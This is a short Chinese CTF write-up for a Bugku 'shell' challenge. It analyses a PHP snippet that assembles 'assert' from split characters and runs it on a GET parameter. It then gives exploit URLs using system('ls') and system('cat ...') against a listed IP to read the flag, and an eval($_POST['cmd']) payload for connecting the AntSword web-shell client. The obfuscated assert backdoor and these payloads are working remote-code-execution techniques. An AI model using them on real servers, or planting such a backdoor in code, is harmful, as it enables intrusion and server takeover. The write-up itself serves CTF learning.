# Bugku CTF shell 题 WriteUp

---

#### 题目分析

题目给出了一段PHP代码：

```PHP

$poc = "a#s#s#e#r#t";
$poc_1 = explode("#", $poc);
$poc_2 = $poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];
$poc_2($_GET['s']);
```

- `explode("#", $poc)` 将字符串按`#`分割，得到数组 `["a", "s", "s", "e", "r", "t"]`。

- 拼接数组元素后，`$poc_2` 的值为 `"assert"`。

- 最终执行 `assert($_GET['s'])`，这意味着我们可以通过GET参数`s`注入并执行任意PHP代码。

---

#### 解题步骤

1. **执行系统命令查看文件**

利用`assert`函数执行`system()`函数，调用系统命令`ls`列出当前目录下的文件：

```Plain Text

http://171.80.2.169:15203/?s=system('ls')
```

执行后会返回目录下的文件列表，其中包含flag文件（如`flaga15808abee46a1d5.txt`）。

1. **读取flag文件内容**

继续使用`system()`函数执行`cat`命令，读取flag文件的内容：

```Plain Text

http://171.80.2.169:15203/?s=system('cat flaga15808abee46a1d5.txt')
```

执行后页面会直接显示flag的内容。

---

#### 扩展：使用蚁剑连接

如果需要更方便地操作服务器，可以构造Payload让蚁剑连接：

1. 构造URL：`http://171.80.2.169:15203/?s=eval($_POST['cmd'])`

2. 在蚁剑中添加该URL，密码设置为`cmd`，即可通过蚁剑直接管理服务器文件，查看和下载flag。
> （注：文档部分内容可能由 AI 生成）